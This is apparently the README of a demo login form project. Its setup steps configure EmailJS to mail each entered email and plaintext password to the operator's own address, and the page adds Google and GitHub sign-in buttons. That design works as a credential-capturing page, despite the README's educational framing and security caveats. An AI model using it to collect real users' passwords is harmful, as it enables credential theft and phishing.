# Stylish Email & Password Login Form

A modern, elegant login form built with HTML, CSS, and JavaScript featuring email and password input fields, with integration for sending credentials to an email address using EmailJS.

## Features

### ✨ Design Highlights
- **Modern Gradient Background**: Dynamic animated gradients creating depth
- **Glassmorphism Effects**: Smooth shadows and subtle animations
- **Responsive Design**: Fully optimized for mobile, tablet, and desktop
- **Interactive Elements**: Hover effects, focus states, and smooth transitions
- **Visual Feedback**: Loading animations, success/error notifications
- **Password Visibility Toggle**: Show/hide password functionality

### 📱 Responsive Breakpoints
- **Mobile**: 0 - 480px
- **Tablet**: 481px - 768px
- **Desktop**: 769px +

### 🎨 Key Features
- **Email Validation**: Real-time email format checking
- **Password Strength**: Minimum 6 characters validation
- **Remember Me**: LocalStorage integration for email persistence
- **Social Login**: Google and GitHub buttons (placeholder functionality)
- **Forgot Password**: Reset password link (placeholder functionality)
- **Sign Up Link**: Navigation to registration form (placeholder functionality)

## Getting Started

### Prerequisites
1. **EmailJS Account**: Create a free account at [emailjs.com](https://www.emailjs.com)
2. **API Keys**: Obtain your Public Key, Service ID, and Template ID

### Installation

1. **Download or Clone the Files**:
   - `index.html` - Main HTML structure
   - `styles.css` - Styling and animations
   - `script.js` - JavaScript functionality
   - `README.md` - Documentation

2. **Update EmailJS Configuration in `script.js`**:
   ```javascript
   // Line 6: Replace with your EmailJS Public Key
   emailjs.init("YOUR_PUBLIC_KEY_HERE");
   
   // Line 75: Replace with your EmailJS Service ID and Template ID
   await emailjs.send('YOUR_SERVICE_ID_HERE', 'YOUR_TEMPLATE_ID_HERE', templateParams);
   ```

3. **Configure EmailJS Template**:
   - Create a new email template in your EmailJS dashboard
   - Set up the following template fields:
     - `{{to_email}}` - Recipient email (your email)
     - `{{from_email}}` - User's email address
     - `{{password}}` - User's password
     - `{{submitted_at}}` - Submission timestamp

### Usage

1. **Open the Form**:
   - Open `index.html` in a web browser
   - The form will be centered on the screen with animated background

2. **Fill in Credentials**:
   - Enter your email address
   - Enter your password (minimum 6 characters)
   - Optionally check "Remember me" to save your email

3. **Submit Form**:
   - Click the "Sign In" button
   - A loading animation will appear
   - A success notification will show if submission is successful
   - An error notification will show if there's a problem

### Social Login (Placeholder)

The social login buttons (Google and GitHub) are currently placeholder functionality. They will show a notification indicating that the feature is coming soon.

## Customization

### Colors
Modify the CSS variables in `styles.css` (lines 9-45) to customize colors:
```css
:root {
    --primary-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    --secondary-gradient: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
    --accent-gradient: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
    --dark-gradient: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
    /* ... other colors ... */
}
```

### Typography
Change the font family in `styles.css` (lines 53-55):
```css
body {
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
}
```

### Animations
Adjust animation timings and effects in `styles.css` (animations section at the bottom):
```css
@keyframes fadeInUp {
    from {
        opacity: 0;
        transform: translateY(30px);
    }
    to {
        opacity: 1;
        transform: translateY(0);
    }
}
```

### Form Fields
Add or remove fields in `index.html` and update the validation in `script.js` to match.

## Browser Support

- **Chrome**: 87+
- **Firefox**: 85+
- **Safari**: 14+
- **Edge**: 88+

## Security Considerations

### Important Notes

1. **EmailJS Limitations**: EmailJS is a client-side library and should not be used for sensitive data transmission
2. **Password Security**: This is a demo application - never send passwords via unencrypted email
3. **HTTPS**: Always use HTTPS in production environments
4. **Real Applications**: For real-world scenarios, use server-side authentication with secure password storage (bcrypt, Argon2)

### For Educational Purposes Only

This implementation is designed for educational purposes to demonstrate form design and basic email integration. It should not be used in production environments without proper security implementation.

## License

MIT License - feel free to use this for learning purposes.

## Contributing

This is a demo project, but contributions for improvements are welcome!

## Acknowledgments

- [EmailJS](https://www.emailjs.com) for email integration
- [Font Awesome](https://fontawesome.com) for icons
- [Google Fonts](https://fonts.google.com) for typography